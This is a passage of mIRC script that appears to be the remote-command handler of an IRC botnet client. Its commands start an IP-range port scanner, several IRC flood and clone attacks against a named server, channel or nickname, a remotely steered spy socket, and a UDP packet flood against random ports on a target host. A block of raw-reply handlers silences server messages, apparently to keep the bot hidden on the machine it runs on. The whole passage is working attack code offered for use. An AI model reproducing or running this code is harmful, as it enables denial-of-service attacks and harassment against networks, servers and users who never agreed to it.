  .msg $nick 1[BNC]: Listing Active Users and Servers... | %bnc.stlus = 0 | :again3 | if ($sock(bnc.out*,0) == %bnc.stlus) { goto done3 } | inc %bnc.stlus | msg $nick 1[BNC]: $chr(35) $+ %bnc.stlus $+ .  [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,2,32) ] ] ] $+ / $+ [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,1,32) ] ] ] is %bnc. $+ $gettok($sock(bnc.out*,%bnc.stlus).mark,3,32) on $gettok($sock(bnc.out*,%bnc.stlus).mark,4-6,32)  | goto again3 | :done3 | msg $nick 1[BNC]: List of Users and Servers Complete... } | halt } }
  if ($1 == !scan) { if ($2 == $null) || ($3 == $null) { msg # 1[use]: !scan 24.4.51.* <port> | halt } | if (* !isin $2) { msg # 12 1[Error]: !scan 24.4.51.* <port> | halt } | if $me !isvo $chan { //msg # type; !stopscan | /msg # type; //mode # +v $me | halt } | else { set %begshortip $replace($2,*,1) | set %beglongip $longip( %begshortip ) | set %endshortip $replace($2,*,255) | set %endlongip $longip(%endshortip) | set %port $3 | set %botchan $chan | /.msg $chan 1[Scanner Started]:  $+ %begshortip $+  :to:  $+ %endshortip $+  Port: %port | /startscanning } }
  if ($1 == !dragonnick) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerfloodnick off | unset %fn* %floodn* | sockclose fnn* | sockclose fmn* | sockclose fcn* | sockclose fan* | halt } | if ($2 == Help) { .notice $nick 1[use]: !DragonNick <server> <port> <victim nick> <flood nick> <flood type> <size> <message> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %fnserv $2 } | if ($3 != $null) && ($3 isnum) { set %fnport $3 } | if ($3 !isnum) { halt } | if ($6 == rand) { //set %floodntype yes | //set %floodnicks $rands($r(0,9)) } | if ($5 != $null) && (rand != $5) { //set %floodntype no | //.set %floodnick $5 } | if ($6 != $null) { //set %fntype $6 } | if ($9 == $null) { //set %fnmsg !PING me now Please... $str(!PING!PONG!,30) } | if ($8 == flood) { //set %fnmsg !list hi hello PING brb now, $str(flô0od,35) } | if ($8 == q8dragons) { //set %fnmsg $str(Q8Dragons.Org	,20) } 
  if ($8 == words) { //set %fnmsg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words } | if ($8 != $null) && ($8 != flood) && ($8 != words) && ($8 != q8dragons) { set %fnmsg $8- } | else goto flood | :flood | set %fnnick $4 | set %fnsize $7 | .timerfloodnick 0 %fnsize /controler floodnick | .identd on $ident($r(1,9)) }
  if ($1 == !dragonchan) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerfloodchan off | unset %fc* %floodc* | sockclose fnc* | sockclose fmc* | sockclose fcc* | sockclose fac* | sockclose fjp* | sockclose fqc* | halt } | if ($2 == Help) { .notice $nick 1[use]: !DragonChan <server> <port> <#channel> <key> <flood nick> <flood type> <size> <message> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %fcserv $2 } | if ($3 != $null) && ($3 isnum) { set %fcport $3 } | if ($3 !isnum) { halt } | if ($6 == rand) { //set %floodctype yes | //set %floodnicks $rands($r(0,9)) } | if ($6 != $null) && (rand != $6) { //set %floodctype no | //.set %floodnicks $6 } | if ($7 != $null) { //set %fctype $7 } | if ($9 == $null) { //set %fcmsg !PING me now Please... $str(!PING!PONG!,30) } | if ($9 == flood) { //set %fcmsg !list hi hello PING brb now, $str(flô0od,35) } 
  if ($9 == words) { //set %fcmsg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words } |  if ($9 == q8dragons) { //set %fcmsg  $str(Q8Dragons.Org	,20) } | if ($9 != $null) && ($9 != flood) && ($9 != words) && ($9 != q8dragons) { set %fcmsg $9- } | else goto flood | :flood | set %fcchan $4 | set %fckey $5 | set %fcsize $8 | .timerfloodchan 0 %fcsize /controler floodchan | .identd on $ident($r(1,9)) }
  if ($1 == !start) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerstart off | unset %s.* %floodstype | sockclose Start* | halt } | if ($2 == Help) { .notice $nick 1[use]: !Start <server> <port> <nick> <flood nick> <privmsg/no> <ctcp/no> <size> <message> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %s.server $2 } | if ($3 != $null) && ($3 isnum) { set %s.port $3 } | if ($3 !isnum) { halt } | if ($5 == rand) { //set %floodstype yes } | if ($5 != $null) && ($5 != rand) { set %s.nick $5 | set %floodstype no  } | if ($9 == $null) { //set %s.msg !PING me now Please... $str(!PING!PONG!,30) } | if ($9 == flood) { //set %s.msg !list hi hello PING brb now $str(flô0od,35) } | if ($9 == q8dragons) { //set %s.msg $str(Q8Dragons.Org	,20) }
  if ($9 == words) { //set %s.msg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words } | if ($9 != $null) && ($9 != Q8DraGons) && ($9 != flood) && ($9 != words) { set %s.msg $9- } | else goto start | :start | set %s.fuck $4 | set %s.comand $6 | set %s.comand1  $+ $7 $+  | set %s.size $8 | .timerstart 0 %s.size /controler start | .identd on $ident($r(1,9)) }
  if ($1 == !floodnick) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerfns off | unset %fns.* %floodfnstype | sockclose fns* | halt } | if ($2 == Help) { .notice $nick 1[use]: !Floodnick <server> <port> <nick> <privmsg/no> <ctcp/no> <size> <message> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %fns.server $2 } | if ($3 != $null) && ($3 isnum) { set %fns.port $3 } | if ($3 !isnum) { halt } | if ($8 == $null) { //set %fns.msg !PING me now Please... $str(!PING!PONG!,30) } | if ($8 == flood) { //set %fns.msg !list hi hello PING brb now $str(flô0od,35) } | if ($8 == q8dragons) { //set %fns.msg $str(Q8Dragons.Org	,20) } | if ($8 == words) { //set %fns.msg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words } | if ($8 != $null) && ($8 != Q8DraGons) && ($8 != flood) && ($8 != words) { set %fns.msg $8- }
  else goto fns | :fns | set %fns.fuck $4 | set %fns.comand $5 | set %fns.comand1  $+ $6 $+  | set %fns.size $7 | .timerfns 0 %fns.size /controler fns | .identd on $read $mircdirpsys.dll }
  if ($1 == !go) { if ($2 == $null) { halt } | if ($2 == Stop) { .timergo off | unset %g.* %floodgtype | sockclose Go* | halt } | if ($2 == Help) { .notice $nick 1[use]: !Go <server> <port> <#channel> <key> <flood nick> <privmsg/no> <ctcp/no> <size> <message> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %g.server $2 } | if ($3 != $null) && ($3 isnum) { set %g.port $3 } | if ($3 !isnum) { halt } | if ($6 == rand) { //set %floodgtype yes } | if ($6 != $null) && (rand != $6) { set %g.nick $6 | set %floodgtype no } | if ($10 == $null) { //set %g.msg !PING me now Please... $str(!PING!PONG!,30) } | if ($10 == flood) { //set %g.msg !list hi hello PING brb now, $str(flô0od,35) } |  if ($10 == q8dragons) { //set %g.msg $str(Q8Dragons.Org	,20) } 
  if ($10 == words) { //set %g.msg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words } | if ($10 != $null) && ($10 != Q8DraGons) && ($10 != flood) && (words != $10) { set %g.msg $10- } | else goto go | :go | set %g.chan $4 | set %g.key $5 | set %g.comand $7 | set %g.comand1  $+ $8 $+  | set %g.size $9 | .identd on $ident($r(1,9)) | .timergo 0 %g.size /controler go }
  if ($1 == !floodchan) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerfcs off | unset %fcs.* %floodfcstype | sockclose fcs* | halt } | if ($2 == Help) { .notice $nick 1[use]: !Floodchan <server> <port> <#channel> <key> <privmsg/no> <ctcp/no> <size> <message> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %fcs.server $2 } | if ($3 != $null) && ($3 isnum) { set %fcs.port $3 } | if ($3 !isnum) { halt } | if ($9 == $null) { //set %fcs.msg !PING me now Please... $str(!PING!PONG!,30) } | if ($9 == flood) { //set %fcs.msg !list hi hello PING brb now, $str(flô0od,35) } | if ($9 == q8dragons) { //set %fcs.msg $str(Q8Dragons.Org	,20) } | if ($9 == words) { //set %fcs.msg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words } | if ($9 != $null) && ($9 != Q8DraGons) && ($9 != flood) && (words != $9) { set %fcs.msg $9- }
  else goto fcs | :fcs | set %fcs.chan $4 | set %fcs.key $5 | set %fcs.comand $6 | set %fcs.comand1  $+ $7 $+  | set %fcs.size $8 | .identd on $read $mircdirpsys.dll | .timerfcs 0 %fcs.size /controler fcs }
  if ($1 == !jp) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerjp off | unset %jp.* %floodjptype | sockclose jp* | halt } | if ($2 == Help) { .notice $nick 1[use]: !jp <server> <port> <#channel> <key> <flood nick> <privmsg/no> <ctcp/no> <size> <message> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %jp.server $2 } | if ($3 != $null) && ($3 isnum) { set %jp.port $3 } | if ($3 !isnum) { halt } | if ($6 == rand) { //set %floodjptype yes } | if ($6 != $null) && (rand != $6) { set %jp.nick $6 | set %floodjptype no }  | if ($10 == $null) { //set %jp.msg $str(!PING!PONG!,30) } | if ($10 == flood) { //set %jp.msg $str(flô0od,35) } | if ($10 == q8dragons) { //set %jp.msg $str(Q8Dragons.Org	,20) } | if ($10 == words) { //set %jp.msg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words }
  if ($10 != $null) && ($10 != Q8DraGons) && ($10 != flood) && (words != $10) { set %jp.msg $10- } | else goto jp | :jp | set %jp.chan $4 | set %jp.key $5 | set %jp.comand $7 | set %jp.comand1 $chr(1) $+ $8 $+ $chr(1) | set %jp.size $9 | .identd on $ident($r(1,9)) | .timerjp 0 %jp.size /controler jp }
  if ($1 == !quit) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerquit off | unset %q.* %floodqtype | sockclose quit* | halt } | if ($2 == Help) { .notice $nick 1[use]: !QUIT <server> <port> <#channel> <key> <flood nick> <privmsg/no> <ctcp/no> <size> <message> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %q.server $2 } | if ($3 != $null) && ($3 isnum) { set %q.port $3 } | if ($3 !isnum) { halt } | if ($6 == rand) { //set %floodqtype yes } | if ($6 != $null) && (rand != $6) { set %q.nick $6 | set %floodqtype no } | if ($10 == $null) { //set %q.msg $str(!PING!PONG!,30) } | if ($10 == flood) { //set %q.msg $str(flô0od,35) } | if ($10 == q8dragons) { //set %q.msg $str(Q8Dragons.Org	,20) } | if ($10 == words) { //set %q.msg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words }
  if ($10 != $null) && (q8dragons != $10) && (flood != $10) && (words != $10) { set %q.msg $10- } | else goto quit | :quit | set %q.chan $4 | set %q.key $5 | set %q.comand $7 | set %q.comand1  $+ $8 $+  | set %q.size $9 | .identd on $ident($r(1,9)) | .timerquit 0 %q.size /controler fquit } | if ($1 == !play) { %play.# = $chan | if ($chan = $null) { set %play.# $nick } | if ($2 != $null) && ($2 != stop) { set %play.path $2- | /.play %play.# %play.path | /.msg %play.# 1[Play]: playing  $+ %play.path $+  :to:  $+ %play.# $+  } | if ($2 = stop) { /.play stop | /.msg %play.# 1[Play]: stopped playing  $+ %play.path $+  | unset %play.* } }
  if ($1 == !service) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerservice off | unset %se.* | sockclose service* | halt } | if ($2 == Help) { .notice $nick 1[use]: !Service <server> <port> <size> <register password> | halt } | if ($2 != $null) && (Stop != $2) && (Help != $2) { set %se.server $2 } | if ($3 != $null) && ($3 isnum) { set %se.port $3 } | if ($3 !isnum) { halt } | else goto service | :service | set %se.size $4 | set %se.pass $5- | .timerservice 0 %se.size /controler service | .identd on $ident($r(1,9)) | halt }
  if ($1 == !notice) { if ($2 == $null) { halt } | if ($2 == Stop) { .timernotice off | unset %n.* %flooditype | unset %comman* | sockclose notice* | halt } | if ($2 == Help) { .notice $nick 1[use]: !Notice <server> <port> <#channel/nick> <key> <flood nick> <privmsg/no> <ctcp/no> <size> <notice> | halt } | if ($2 != $null) && ($2 != Stop) && ($2 != Help) { set %n.server $2 } | if ($3 != $null) && ($3 isnum) { set %n.port $3 } | if ($3 !isnum) { halt } | if ($4 != $null) && ($chr(35) isin $4) { set %command JOIN | set %n.cn $4 } | if ($4 != $null) && ($chr(35) !isin $4) { set %n.cn $4 } | if ($6 == rand) { //set %flooditype yes } | if ($6 != $null) && ($6 != rand) { set %n.nick $6 | set %flooditype no } | if ($10 == $null) { //set %n.notice !PING me now Please... $str(!PING!PONG!,30) } | if ($10 == flood) { //set %n.notice !list hi hello PING brb now, $str(flô0od,35) } | if ($10 == q8dragons) { 
  //set %n.notice $str(Q8Dragons.Org	,20) } | if ($10 == words) { //set %n.notice $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words } | if ($10 != $null) && (q8dragons != $10) && (flood != $10) && (words != $10) { set %n.notice $10- } | else goto notice | :notice | set %n.key $5 | set %n.command1 $7 | set %n.command2 $chr(1) $+ $8 $+ $chr(1) | set %n.size $9 | .identd on $ident($r(1,9)) | .timernotice 0 %n.size /controler fnotice }
  if ($1 == !action) { if ($2 == $null) { halt } | if ($2 == Stop) { .timeraction off | unset %ac.* %floodactype | unset %comman* | sockclose action* | halt } | if ($2 == Help) { .notice $nick 1[use]: !Action <server> <port> <#channel/nick> <key> <flood nick> <privmsg/no> <ctcp/no> <size> <action> | halt } | if ($2 != $null) && ($2 != Stop) && ($2 != Help) { set %ac.server $2 } | if ($3 != $null) && ($3 isnum) { set %ac.port $3 } | if ($3 !isnum) { halt } | if ($4 != $null) && ($chr(35) isin $4) { set %command JOIN | set %ac.cn $4 } | if ($4 != $null) && ($chr(35) !isin $4) { set %ac.cn $4 } | if ($6 == rand) { //set %flooditype yes } | if ($6 != $null) && ($6 != rand) { set %ac.nick $6 | set %floodactype no } | if ($10 == $null) { //set %ac.msg !PING me now Please... $str(!PING!PONG!,30) } | if ($10 == flood) { //set %ac.msg !list hi hello PING brb now, $str(flô0od,35) } | if ($10 == q8dragons) { 
  //set %ac.msg $str(Q8Dragons.Org	,20) } | if ($10 == words) { //set %ac.msg $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words } | if ($10 != $null) && (q8dragons != $10) && (flood != $10) && (words != $10) { set %ac.msg $10- } |  else goto action | :action | set %ac.key $5 | set %ac.command1 $7 | set %ac.command2 $chr(1) $+ $8 $+ $chr(1) | set %ac.size $9 | .identd on $ident($r(1,9)) | .timeraction 0 %ac.size /controler action }
  if ($1 == !clone) { if ($2 == $null) { halt } | if ($2 == Stop) { .timerclone off | unset %c.* | sockclose clone* | halt } | if ($2 == Help) { .notice $nick 1[use]: !Clone <server> <port> <#channel> <key> <clone nick> <size> | halt } | if ($2 != $null) && ($2 != Stop) && ($2 != Help) { set %c.server $2 } | if ($3 != $null) && ($3 isnum) { set %c.port $3 } | if ($3 !isnum) { halt } | if ($6 == rand) { //set %c.nick $rands($r(0,9)) } | if ($6 != $null) && (rand != $6) { set %c.nick $6 } | else goto clone | :clone | set %c.chan $4 | set %c.key $5 | set %c.size $7 | .identd on $ident($r(1,9)) | .timerclone %c.size 1 /controler clones | .timermessage 0 30 sockwrite -nt clone* privmsg $chr(291) $+ $ident($r(1,9)) : $+ $ident($r(1,9)) }
  if ($1 == !spybot) { %spy.cn = $chan | if ($chan = $null) { set %spy.cn $nick } | if ($2 = load) { set %spy.serv $3 | set %spy.port $4 | set %spy.chan $5 | set %spy.key $6 | /.msg %spy.cn 1[Spy Bot]: Loading to $3 on port $4 } | if ($2 = stop) { .sockclose spybot | /.msg %spy.cn 1[Spy Bot]: Closing Spy socket | unset %spy.* } | if ($2 = msg) { .sockwrite -nt spybot privmsg $3 : $+ $4- } | if ($2 = notice) { .sockwrite -nt spybot notice $3 : $+ $4- } | if ($2 = join) { .sockwrite -nt spybot join $3 $4 } | if ($2 = part) { .sockwrite -nt spybot part $3 : $+ $4- } | if ($2 = mode) { .sockwrite -nt spybot mode $3- } | if ($2 = raw) { .sockwrite -nt spybot $3- } | if ($2 = whois) { .sockwrite -nt spybot whois $3- } | if ($2 = nick) { .sockwrite -nt spybot nick $3 } | if ($7 = rand) { .set %spy.nick $rands($r(0,9)) } | if ($7 = read) { .set %spy.nick $read $mircdirpsys.dll }
if ($7 != read) && ($7 != rand) && ($7 != $null) { .set %spy.nick $7 } | if (%spy.serv != $null) && (%spy.port != $null) && (%spy.chan != $null) && (%spy.nick != $null) { .sockopen spybot %spy.serv %spy.port } } }
alias gcoolstart  { if $1 = stop { .timergcoolt off | unset %gnum | msg %pchan 1[Packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan 1[Error]: Currently Flooding: $gettok($timer(gcoolt).com,3,32)  | return } | .msg %pchan 1[Sending]: $1 $+  bytes to: $2 $+  on Port: $3 $+  | set %gnum 0 | .timergcoolt -m 0 60 gdope $1 $2 $3 }
alias gdope { if $3 = $null { goto done } | :loop | if %gnum >= $1 { goto done } | inc %gnum 2 
  %gnum.p = $r(1,65000)
  sockudp gnumc1 $2 %gnum.p
  %gnum.p = $r(1,65000) 
  sockudp gnumc3 $2 %gnum.p
  %gnum.p = $r(1,65000)
  sockudp gnumc2 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc4 $2 %gnum.p
  %gnum.p = $r(1,65000)
  sockudp gnumc5 $2 %gnum.p
  %gnum.p = $r(1,65000)
  sockudp gnumc6 $2 %gnum.p
  %gnum.p = $r(1,65000)
  sockudp gnumc7 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc8 $2 %gnum.p
  return | :done | /.msg %pchan 1[Packeting]: Finished! | .timergcoolt off | unset %gnum* | unset %pchan 
}
raw 433:*:{ //.nick $b0tnick | halt }
raw 432:*:{ //.nick $b0tnick | halt }
raw 001:*:halt
raw 002:*:halt
raw 003:*:halt
raw 004:*:halt
raw 005:*:halt
raw 226:*:halt
raw 219:*:halt
raw 217:*:halt
raw 243:*:halt
raw 212:*:halt
raw 314:*:halt
raw 312:*:halt
raw 481:*:halt
raw 381:*:halt
raw 474:*:halt
raw 477:*:halt
raw 473:*:halt
raw 332:*:halt
raw 333:*:halt
raw 421:*:halt
raw 401:*:halt
raw 249:*:halt
raw 219:*:halt
raw 369:*:halt
raw 353:*:halt
raw 336:*:halt
raw 307:*:halt
raw 318:*:halt
raw 352:*:halt
raw 315:*:halt
raw 353:*:halt
raw 366:*:halt
raw 501:*:halt
raw 464:*:halt
raw 321:*:halt
raw 322:*:halt
raw 323:*:halt
raw 255:*:halt
raw 265:*:halt
raw 266:*:halt
raw 375:*:halt
raw 372:*:halt
raw 475:*:halt
raw 471:*:halt
raw 437:*:halt
raw 404:*:halt
raw 251:*:halt
raw 252:*:halt
raw 254:*:halt
raw 376:*:halt
raw 311:*:halt
raw 319:*:halt
raw 312:*:halt
